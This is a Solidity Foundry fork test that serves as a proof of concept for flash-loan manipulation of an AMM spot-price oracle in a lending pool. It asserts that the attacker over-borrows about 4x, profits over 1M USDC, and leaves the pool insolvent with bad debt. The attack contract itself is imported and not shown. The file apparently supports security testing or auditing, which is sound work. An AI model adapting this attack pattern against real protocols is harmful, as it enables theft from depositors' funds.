// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "../src/interfaces/IERC20.sol";
import {OracleAttackReceiver} from "../src/OracleAttackReceiver.sol";
import {BaseForkTest} from "./BaseFork.t.sol";

/// @title Fork proof of concept: flash-loan-induced AMM oracle manipulation
/// @notice The lending pool values WETH collateral from the instantaneous AMM spot
///         price. A flash loan buys WETH, moves the spot price ~4x, and lets the
///         attacker borrow 4x the safe amount. After arbitrage restores the market
///         price, the position is deeply undercollateralized and the pool is insolvent.
contract FlashLoanOracleManipulationTest is BaseForkTest {
    uint256 internal constant FLASH_AMOUNT = 2_000_000e6;
    uint256 internal constant ATTACK_COLLATERAL = 500e18;
    uint256 internal constant SAFE_BORROW_FOR_ATTACK_COLLATERAL = 800_000e6;

    OracleAttackReceiver internal receiver;

    function setUp() public override {
        super.setUp();
        receiver = _deployReceiver();
        vm.label(address(receiver), "attack-receiver");

        _deposit(alice, ATTACK_COLLATERAL);
    }

    function test_flashLoanSpotOracleManipulation() public {
        uint256 priceBefore = oracle.getPrice();
        uint256 poolUsdcBefore = IERC20(USDC).balanceOf(address(lendingPool));
        uint256 safeMaxBorrow = lendingPool.maxBorrow(alice);

        console2.log("1. baseline spot price", priceBefore);
        console2.log("2. safe max borrow for 500 WETH", safeMaxBorrow);
        console2.log("3. flash loan size", FLASH_AMOUNT);
        assertLt(safeMaxBorrow, FLASH_AMOUNT, "flash loan must exceed safe borrowing power");
        assertEq(priceBefore, 2_000e18, "unexpected baseline price");

        receiver.attack(FLASH_AMOUNT);

        uint256 priceAfterPump = oracle.getPrice();
        uint256 borrowed = receiver.borrowedAgainstCollateral();
        uint256 profit = IERC20(USDC).balanceOf(attacker);

        console2.log("4. manipulated spot price", priceAfterPump);
        console2.log("5. borrowed against manipulated value", borrowed);
        console2.log("6. attacker profit after repaying flash loan", profit);

        assertApproxEqRel(receiver.collateralDeposited(), ATTACK_COLLATERAL, 0.002e18, "wrong collateral");
        assertApproxEqRel(priceAfterPump, 8_000e18, 0.002e18, "price did not pump ~4x");
        assertApproxEqRel(borrowed, 3_200_000e6, 0.01e18, "borrow should be ~80% of inflated value");
        assertGt(borrowed, safeMaxBorrow, "borrowed no more than the safe amount");
        assertEq(borrowed, lendingPool.debt(address(receiver)), "debt accounting mismatch");
        assertGt(profit, 1_000_000e6, "attack should be profitable");

        // Simulate arbitrageurs restoring the AMM to its pre-manipulation price.
        uint256 keeperWeth = 500e18;
        deal(WETH, keeper, keeperWeth);
        vm.startPrank(keeper);
        IERC20(WETH).approve(address(amm), keeperWeth);
        amm.swapExactTokensForTokens(keeperWeth, 0, WETH, keeper);
        vm.stopPrank();

        uint256 restoredPrice = oracle.getPrice();
        uint256 collateralValueAfter = lendingPool.collateralValue(address(receiver));
        uint256 debtAfter = lendingPool.debt(address(receiver));
        uint256 poolUsdcAfter = IERC20(USDC).balanceOf(address(lendingPool));
        uint256 healthFactorAfter = lendingPool.healthFactor(address(receiver));
        uint256 badDebt = debtAfter > collateralValueAfter ? debtAfter - collateralValueAfter : 0;

        console2.log("7. restored spot price", restoredPrice);
        console2.log("8. collateral value after restore", collateralValueAfter);
        console2.log("9. outstanding debt", debtAfter);
        console2.log("10. protocol bad debt", badDebt);
        console2.log("11. health factor (1e18 = 1.0)", healthFactorAfter);
        console2.log("12. pool USDC remaining", poolUsdcAfter);

        assertApproxEqRel(restoredPrice, 2_000e18, 0.01e18, "price did not restore");
        assertApproxEqAbs(collateralValueAfter, 1_000_000e6, 10_000e6, "wrong restored collateral value");
        assertGt(debtAfter, collateralValueAfter, "debt should exceed collateral value");
        assertLt(healthFactorAfter, 1e18, "position should be liquidatable / insolvent");
        assertGt(badDebt, 2_000_000e6, "bad debt should exceed 2M USDC");
        assertLt(poolUsdcAfter, debtAfter, "pool cannot cover its debt");
        assertEq(poolUsdcBefore - poolUsdcAfter, borrowed, "pool outflow mismatch");

        // 4x overstatement of collateral, measured against the restored true value.
        assertGt((debtAfter * 1e18) / collateralValueAfter, 3.18e18, "effective LTV should exceed 318%");
    }

    /// @dev Runs the same attack with a small flash loan, where the pump (and the
    ///      over-borrow) still exists but is not enough to make the attack profitable
    ///      without extra attacker capital. Included to show severity scales with size.
    function test_smallFlashLoanStillOverBorrows() public {
        OracleAttackReceiver smallReceiver = _deployReceiver();
        _fundReceiver(address(smallReceiver), 100_000e6);

        smallReceiver.attack(250_000e6);

        uint256 manipulated = oracle.getPrice();
        uint256 borrowed = smallReceiver.borrowedAgainstCollateral();

        console2.log("small-loan manipulated price", manipulated);
        console2.log("small-loan amount borrowed", borrowed);

        assertGt(manipulated, 2_100e18, "price should rise");
        assertGt(borrowed, 200_000e6, "borrow should exceed the safe 80% of true value");
    }
}
